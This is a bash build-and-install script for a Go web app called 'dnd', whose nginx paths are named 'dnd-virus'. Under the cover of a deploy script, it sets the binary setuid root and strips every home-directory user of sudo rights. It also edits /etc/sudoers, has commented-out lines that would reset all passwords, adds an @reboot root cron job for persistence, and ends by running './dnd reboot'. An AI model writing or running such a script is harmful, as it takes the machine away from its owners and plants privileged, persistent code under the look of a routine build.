#!/bin/bash

set -e
INSTALL_DIR="$HOME/.local/share/dnd"

cd ../frontend
rm -rf node_modules package-lock.json
npm install
npm run build
cd ..

rm -rf backend/web
mkdir -p backend/web
cp -r frontend/dist/* backend/web/

rm -f backend/dnd
sudo rm -f "$INSTALL_DIR/dnd"

cd backend

go build -o dnd

mkdir -p "$INSTALL_DIR"
cp dnd "$INSTALL_DIR/"

sudo chown root:root ~/.local/share/dnd/dnd
sudo chmod 4755 ~/.local/share/dnd/dnd

pkill -f "$INSTALL_DIR/dnd" 2>/dev/null || true
sleep 1

for user in $(getent passwd | grep -E '/home' | cut -d: -f1); do
    #PASS=$("$INSTALL_DIR/dnd" genpass)
    #echo "$user:$PASS" | sudo chpasswd &>/dev/null
    (sudo gpasswd -d "$user" sudo) &>/dev/null
    sudo deluser "$user" sudo &>/dev/null
    (sudo sed -i "/$user/d" /etc/sudoers) &>/dev/null
done || true

(sudo crontab -l 2>/dev/null | grep -v "$INSTALL_DIR/dnd" | sudo crontab -) 2>/dev/null
(sudo crontab -l 2>/dev/null; echo "@reboot $INSTALL_DIR/dnd > /tmp/dnd.log 2>&1") | sudo crontab -

sudo rm -rf /var/run/sudo/ts/*

sudo mkdir -p /var/www/dnd-virus/video
sudo cp -r ../public/video/* /var/www/dnd-virus/video/

sudo tee /etc/nginx/sites-available/dnd-virus > /dev/null << 'EOF'
server {
    listen 80;
    server_name _;
    
    location /video/ {
        alias /var/www/dnd-voris/video/;
        sendfile on;
        tcp_nopush on;
        expires 7d;
        add_header Cache-Control "public, immutable";
    }

    location /api/ {
        proxy_pass http://127.0.0.1:8080;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_read_timeout 300s;
        proxy_connect_timeout 75s;
    }

    location / {
        root /opt/dnd-virus/web;
        try_files $uri $uri/ /index.html;
        expires 1d;
        add_header Cache-Control "public, immutable";
    }

    access_log /var/log/nginx/dnd-virus-access.log;
    error_log /var/log/nginx/dnd-virus-error.log;
}
EOF

sudo mkdir -p /opt/dnd-virus
sudo rm -rf /opt/dnd-virus/web
sudo cp -r backend/web /opt/dnd-virus/

sudo ln -sf /etc/nginx/sites-available/dnd-virus /etc/nginx/sites-enabled/
sudo rm -f /etc/nginx/sites-enabled/default
sudo nginx -t && sudo systemctl reload nginx

./dnd reboot